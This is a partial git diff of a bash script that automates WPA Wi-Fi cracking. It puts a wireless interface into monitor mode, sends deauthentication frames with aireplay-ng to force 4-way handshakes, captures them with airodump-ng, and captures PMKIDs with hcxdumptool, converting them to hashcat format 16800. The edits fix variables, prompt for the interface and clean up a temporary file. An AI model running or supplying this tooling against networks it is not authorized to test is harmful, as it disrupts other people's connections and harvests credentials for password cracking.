@@ -1,7 +1,7 @@
 #!bin/bash
 # Run with root privileges.
 method=${method:-"4_way_handshake_aircrack"}
-wn_interface=${wn_interface:-wlan1}
+wn_interface=${wn_interface:-"not_specified"}
 target_bssid=${target_bssid:-"not_specified"}
 channel=${channel:-"not_specified"}
 capture_file_name=${capture_file_name:-"not_specified"}
@@ -16,6 +16,15 @@ while [ $# -gt 0 ]; do
 
   shift
 done
+
+if [[ $wn_interface == "not_specified" ]]; then
+  read -p "Type the interface: " wn_interface
+fi
+
+if [[ $capture_file_name == "not_specified" ]]; then
+  current_time=$(date "+%H.%M.%S")
+  capture_file_name=wpa_capture_${current_time}
+fi
 
 if [[ $method == "4_way_handshake_aircrack" ]]; then
   airmon-ng start $wn_interface
@@ -33,14 +42,9 @@ if [[ $method == "4_way_handshake_aircrack" ]]; then
     killall xterm
   fi
 
-  if [[ $capture_file_name == "not_specified" ]]; then
-    current_time=$(date "+%H.%M.%S")
-    capture_file_name=wpa_capture_${current_time}
-  fi
-
   xterm -title "airodump-ng on ${target_bssid}" -e airodump-ng --bssid $target_bssid -c $channel --write $capture_file_name $wn_interface_monitor &
 
-  echo "In order to keep level of network jamming at minimum you will send deauth signal by hand. Look on the second terminal if you see 'WPA handshake' (right top coner) you are golden."
+  echo "In order to keep level of network jamming at minimum you will send deauth signal by hand. Look on the second terminal if you see :WPA handshake: (right top coner) you are golden."
 
   continue_loop=true
 
@@ -50,7 +54,7 @@ if [[ $method == "4_way_handshake_aircrack" ]]; then
     case $user_input in
     "")
       echo "Sending deauth."
-      aireplay-ng --deauth 1 -a $bssid $wn_interface_monitor
+      aireplay-ng --deauth 1 -a $target_bssid $wn_interface_monitor
       ;;
     "q")
       echo "Quitting..."
@@ -67,7 +71,7 @@ if [[ $method == "4_way_handshake_aircrack" ]]; then
   echo "Reversing ${wn_interface_monitor} back to ${wn_interface}."
   airmon-ng stop $wn_interface_monitor
 
-  echo "Your handshake is in ${capture_file_name}."
+  echo "Your handshake is in ${capture_file_name}.cap."
   echo "Done."
 
 elif [[ $method == "4_way_handshake_hashcat" ]]; then
@@ -133,7 +137,7 @@ elif [[ $method == "pmkid_hashcat" ]]; then
   echo "Forwarding choosen AP's BSSID to configuration file."
   echo $target_bssid >target_bssid.txt
 
-  echo "Wait until you receive [PMKID FOUND]."
+  echo "Wait until you receive [PMKID FOUND]. This may take some."
   hcxdumptool -i $wn_interface_monitor -o ./dumpfile.pcapng --enable_status=1 --filterlist_ap=target_bssid.txt --filtermode=2
 
   echo "Bringing back wlan services..."
@@ -142,6 +146,8 @@ elif [[ $method == "pmkid_hashcat" ]]; then
   sleep 1
 
   hcxpcaptool -E essidlist -I identitylist -U usernamelist -z ${capture_file_name}.hc16800 dumpfile.pcapng
+
+  rm target_bssid.txt
 
   echo "Converting the capture to hash format 16800."
   hcxpcapngtool -o ./${capture_file_name}.hc16800 ./dumpfile.pcapng
